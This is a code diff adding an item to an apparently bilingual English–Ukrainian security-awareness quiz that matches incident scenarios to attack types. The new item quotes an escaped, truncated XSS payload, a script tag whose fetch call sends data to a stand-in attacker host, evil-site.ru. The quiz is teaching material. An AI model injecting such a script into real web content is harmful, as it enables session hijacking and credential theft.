@@ -194,7 +194,12 @@
 			text: "A field laptop begins behaving strangely after a video file is opened from an external drive. Pop-ups appear, network traffic spikes, and antivirus fails to start. A hidden payload was buried inside the file and activated as soon as it played. / Польовий ноутбук починає поводитися дивно після відкриття відеофайлу з зовнішнього накопичувача. З’являються спливаючі вікна, різко зростає мережевий трафік, а антивірус перестає запускатися. Усередині файлу був прихований шкідливий код, який активувався одразу після відтворення.",
 			answer: "Malware attack / Шкідливе програмне забезпечення",
 			debrief: "This is a general malware attack — using a file as a delivery vehicle. / Це атака зі шкідливим ПЗ — використання файлу як засобу доставки."
-		}
+		},
+	    	{
+			text: "A secure logistics portal receives an anonymous comment on its feedback page: <code>&lt;script&gt;fetch('http://evil-site.ru/steal')...&lt;/script&gt;</code> Suddenly, user sessions start getting hijacked and credentials stolen. The comment section wasn’t supposed to run code — but it did. / Захищений логістичний портал отримує анонімний коментар на сторінці зворотного зв’язку: <code>&lt;script&gt;fetch('http://evil-site.ru/steal')...&lt;/script&gt;</code>. Раптово починається перехоплення сесій користувачів і крадіжка облікових даних. Коментарі не мали виконувати код — але все ж таки виконали.",
+			answer: "XSS attacks / XSS-атаки",
+			debrief: "Classic XSS — code injection into user-facing web content. / Типова XSS — ін'єкція скрипту через інтерфейс користувача."
+		},
 		
     ];
 
